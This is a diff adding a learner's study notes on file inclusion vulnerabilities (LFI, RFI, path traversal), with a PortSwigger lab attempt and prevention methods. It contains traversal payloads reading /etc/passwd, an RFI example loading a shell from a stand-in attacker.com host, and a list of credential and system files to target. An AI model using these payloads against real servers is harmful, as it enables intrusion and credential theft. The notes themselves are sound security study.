@@ -1,0 +1,254 @@
+# Day 14 — File Inclusion
+
+## 📌 What I Learned
+File Inclusion is a vulnerability where
+an attacker tricks the server into
+including unintended files —
+either from the same server
+or from a remote server.
+
+---
+
+## 🔧 What is File Inclusion — How it Works
+
+Instead of putting all content in one
+huge file and rewriting the same content
+repeatedly, developers divide code into
+smaller files and include them in the
+main file whenever needed.
+
+The computer reads those files and
+inserts their contents into the final page.
+
+---
+
+## ⚠️ The Vulnerability
+
+*Vulnerable code example:*
+php
+$page = $_GET['page'];
+include($page);
+
+
+
+Problem:
+User controls which file gets included!
+
+Normal use:
+?page=about.php  ✅
+
+Attacker use:
+?page=secret.txt 😱
+?page=../../../etc/passwd 😱
+
+Server includes unintended files!
+That's File Inclusion Vulnerability!
+
+
+*Arbitrary file path:*
+
+A file location that can be
+dynamically modified or
+specified by the user —
+this is what makes it dangerous!
+
+
+---
+
+## 📁 LFI — Local File Inclusion
+
+
+LFI = Same computer/server
+
+Tricking the server into opening
+a file that already exists
+on the SAME server!
+
+Example:
+?page=../../../etc/passwd
+
+Server reads its own
+password file and
+shows it to attacker!
+
+
+---
+
+## 🌐 RFI — Remote File Inclusion
+
+
+RFI = Another computer on internet
+
+Tricking the server into opening
+a file located on ANOTHER server!
+
+Example:
+?page=http://attacker.com/shell.php
+
+Server downloads and executes
+attacker's malicious file!
+Much more dangerous than LFI!
+Full server takeover possible!
+
+
+---
+
+## 🗂️ Path Traversal — Directory Traversal
+
+Path traversal (also called directory
+traversal) is a vulnerability where
+an attacker manipulates a file path
+to access files and directories
+outside the intended location.
+
+
+../ means "go up one folder"
+
+Example structure:
+/var/www/html/images/ ← website runs here
+
+../     = /var/www/html/
+../../  = /var/www/
+../../../ = /var/ 
+../../../../ = / (root!)
+
+Attack:
+?filename=../../../etc/passwd
+
+Climbs up folders one by one
+until reaching sensitive files!
+
+
+---
+
+## 🎯 Important Target Files
+
+### Linux Targets:
+
+/etc/passwd
+→ List of all users on server
+→ First file to check!
+→ Confirms LFI works!
+
+/etc/shadow
+→ Password hashes
+→ Requires root access
+
+/etc/hosts
+→ Network information
+
+/proc/version
+→ OS and kernel version
+→ Reveals server info!
+
+/var/www/html/config.php
+→ Database credentials!
+→ Most valuable find!
+
+/var/log/apache2/access.log
+→ Server logs
+→ Used in log poisoning attacks!
+
+
+### Windows Targets:
+
+C:\Windows\win.ini
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+
+
+---
+
+## 🛡️ Prevention Methods
+
+
+1. Input Validation
+   Only allow expected filenames
+   Reject anything with ../ 
+   
+2. Use an Allowlist
+   Instead of accepting any file path
+   map user choices to predefined files
+   
+   Example:
+   "1" → about.php
+   "2" → contact.php
+   Never accept raw file paths!
+
+3. Sanitize Input
+   Remove dangerous characters:
+   ../  ..\  %2e%2e%2f etc
+
+4. Restrict File Access
+   Use controlled mapping system
+   Server should only access
+   specific allowed directories
+
+5. Disable Unnecessary Features
+   If file inclusion not needed
+   disable it completely!
+
+6. Use Proper Permissions
+   Files should have correct
+   read/write permissions
+   /etc/shadow not readable
+   by web server user!
+
+7. Keep Software Updated
+   Old PHP versions have
+   more file inclusion bugs!
+
+
+---
+
+## 🔗 Connection to Bug Bounty
+
+
+File inclusion bugs are
+high value findings!
+
+LFI payout: $500 — $5000
+RFI payout: $2000 — $20000+
+
+Why so valuable?
+Reading config files exposes:
+→ Database passwords
+→ API keys
+→ Secret tokens
+→ Other credentials
+
+RFI means full server control!
+Always critical severity!
+
+
+---
+
+## 💡 What I Tried Practically
+
+
+PortSwigger Lab:
+"File path traversal simple case"
+
+Attempted payload:
+?filename=../../../etc/passwd
+
+Setup completed:
+✅ Burp Suite installed on own system
+✅ Firefox configured
+✅ FoxyProxy setup
+✅ Burp certificate installed
+
+Lesson learned:
+Browser shows image error
+for LFI response —
+Burp Repeater needed to
+see raw text response!
+
+
+---
+
+## ⚠️ Important Note
+All file inclusion practice on
+authorized labs only.
+Never test on systems
+without written permission.
